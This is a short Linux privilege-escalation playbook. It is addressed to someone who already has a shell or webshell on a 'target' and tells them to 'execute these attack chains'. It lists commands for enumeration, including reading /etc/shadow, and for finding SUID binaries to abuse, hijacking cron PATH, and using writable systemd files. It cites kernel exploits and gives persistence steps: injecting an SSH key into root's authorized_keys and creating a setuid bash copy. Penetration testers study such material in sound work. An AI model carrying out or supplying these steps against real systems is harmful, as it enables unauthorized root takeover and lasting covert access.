# Linux Privilege Escalation Playbook

When a Linux target is accessed (via shell or webshell), execute these attack chains:

## 1. Local Recon (Enumeration)
- **Kernel Version**: `uname -a`, `cat /etc/issue`, `/proc/version`.
- **User/ID**: `id`, `whoami`, `who`.
- **Permissions**: `sudo -l`, `cat /etc/passwd`, `cat /etc/shadow`.

## 2. Exploiting SUID Binaries
- **Find SUID**: `find / -perm -u=s -type f 2>/dev/null`.
- **Known Vulnerable**: `nmap`, `vim`, `find`, `bash`, `python`, `cp`, `mv`.
- **Method**: Use `GTFOBins` (Google) for specific binary escape commands.

## 3. Cron Job & Logic Abuse
- **Writable Scripts**: `ls -la /etc/cron*`, `grep -i "cron" /var/log/syslog`.
- **PATH Hijacking**: If a cron job runs a script without full paths, create a malicious script in a writable directory in `$PATH`.
- **Systemd**: Check for writable service files in `/etc/systemd/system/`.

## 4. Kernel Exploits (The Reset Button)
- **Dirty COW**: CVE-2016-5195.
- **PwnKit**: CVE-2021-4034 (use `pkexec` if available).
- **Looney Tunables**: CVE-2023-4911.

## 5. Persistence & Rooting
- **SSH Key Injection**: `cat id_rsa.pub >> /root/.ssh/authorized_keys`.
- **New SUID Bash**: `cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash`.
